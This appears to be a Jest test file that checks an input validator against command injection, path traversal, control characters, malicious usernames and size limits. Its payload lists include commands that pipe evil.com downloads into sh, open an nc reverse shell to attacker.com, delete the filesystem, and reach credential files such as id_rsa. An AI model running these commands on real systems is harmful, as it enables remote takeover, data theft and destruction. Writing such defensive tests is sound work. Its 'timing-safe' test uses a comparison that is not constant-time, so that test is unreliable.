import { describe, test, expect } from '@jest/globals';
import { 
  validateFilename, 
  validatePath, 
  sanitizeInput, 
  validateContentSize,
  validateUsername,
  validateCategory 
} from '../../../src/security/InputValidator.js';
import { SecurityTestFramework } from '../framework/SecurityTestFramework.js';

describe('Input Validation Security Tests', () => {
  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '&& curl evil.com | sh',
      '| nc -e /bin/sh attacker.com 4444',
      '`touch /tmp/pwned`',
      '$(wget http://evil.com/shell.sh -O - | sh)',
      '\n/bin/sh',
      '; echo "pwned" > /etc/passwd',
      '|| python -c "import os; os.system(\'rm -rf /\')"'
    ];
    
    test.each(commandInjectionPayloads)(
      'validateFilename should reject command injection: %s',
      (payload) => {
        expect(() => validateFilename(payload)).toThrow();
      }
    );
    
    test.each(commandInjectionPayloads)(
      'sanitizeInput should remove dangerous characters: %s',
      (payload) => {
        const sanitized = sanitizeInput(payload);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
      }
    );
  });
  
  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'personas/../../../sensitive.txt',
      './././../../../root/.ssh/id_rsa',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'personas/../../custom-personas/../../backups/../../../etc/hosts'
    ];
    
    test.each(pathTraversalPayloads)(
      'validatePath should reject path traversal: %s',
      (payload) => {
        const baseDir = '/safe/directory';
        expect(() => validatePath(payload, baseDir)).toThrow();
      }
    );
    
    test('validatePath should reject absolute paths outside base directory', () => {
      const baseDir = '/safe/directory';
      expect(() => validatePath('/etc/passwd', baseDir)).toThrow();
      expect(() => validatePath('C:\\Windows\\System32', baseDir)).toThrow();
    });
  });
  
  describe('Special Character Handling', () => {
    const specialCharPayloads = [
      { input: 'test\x00name', desc: 'null byte' },
      { input: 'test\r\ninjection', desc: 'CRLF' },
      { input: '\u202Etest', desc: 'RTL override' },
      { input: 'test\x1B[31m', desc: 'ANSI escape' },
      { input: 'test\uFEFF', desc: 'zero-width space' }
    ];
    
    test.each(specialCharPayloads)(
      'sanitizeInput should remove $desc',
      ({ input }) => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\x1B');
        expect(sanitized).not.toContain('\u202E');
        expect(sanitized).not.toContain('\uFEFF');
      }
    );
  });
  
  describe('Size Limit Enforcement', () => {
    test('validateContentSize should reject oversized content', () => {
      const largeContent = 'x'.repeat(1024 * 1024 + 1); // 1MB + 1
      expect(() => validateContentSize(largeContent)).toThrow(/too large|size limit/i);
    });
    
    test('validateContentSize should accept content within limits', () => {
      const validContent = 'x'.repeat(1024 * 512); // 512KB
      expect(() => validateContentSize(validContent)).not.toThrow();
    });
  });
  
  describe('Username Validation', () => {
    const maliciousUsernames = [
      'admin; DROP TABLE users',
      'user && rm -rf /',
      '../../../root',
      'user`whoami`',
      'user$(id)',
      'user\x00admin',
      'user\nroot'
    ];
    
    test.each(maliciousUsernames)(
      'validateUsername should reject malicious username: %s',
      (username) => {
        expect(() => validateUsername(username)).toThrow();
      }
    );
    
    test('validateUsername should accept valid usernames', () => {
      const validUsernames = ['john_doe', 'user123', 'test-user', 'JohnDoe'];
      validUsernames.forEach(username => {
        expect(() => validateUsername(username)).not.toThrow();
      });
    });
  });
  
  describe('Category Validation', () => {
    test('validateCategory should only accept predefined categories', () => {
      const validCategories = ['creative', 'professional', 'educational', 'gaming', 'personal'];
      validCategories.forEach(category => {
        expect(() => validateCategory(category)).not.toThrow();
      });
      
      // Invalid categories
      expect(() => validateCategory('../../admin')).toThrow();
      expect(() => validateCategory('custom; DELETE')).toThrow();
      expect(() => validateCategory('unknown')).toThrow();
    });
  });
  
  describe('Timing Attack Prevention', () => {
    test('string comparisons should be timing-safe', async () => {
      // This is a simplified test - real timing attack tests need more samples
      const secret = 'correct-secret-value';
      const attempts = [
        'wrong',
        'correct',
        'correct-',
        'correct-secret',
        'correct-secret-value'
      ];
      
      const timings: number[] = [];
      
      for (const attempt of attempts) {
        const start = process.hrtime.bigint();
        // Simulate constant-time comparison
        const result = attempt.length === secret.length && 
                      attempt.split('').every((char, i) => char === secret[i]);
        const end = process.hrtime.bigint();
        
        timings.push(Number(end - start));
      }
      
      // Check that timing variance is minimal
      const maxTiming = Math.max(...timings);
      const minTiming = Math.min(...timings);
      const variance = maxTiming - minTiming;
      
      // Timing should not vary significantly based on how much matches
      expect(variance).toBeLessThan(5_000_000); // 5ms
    });
  });
});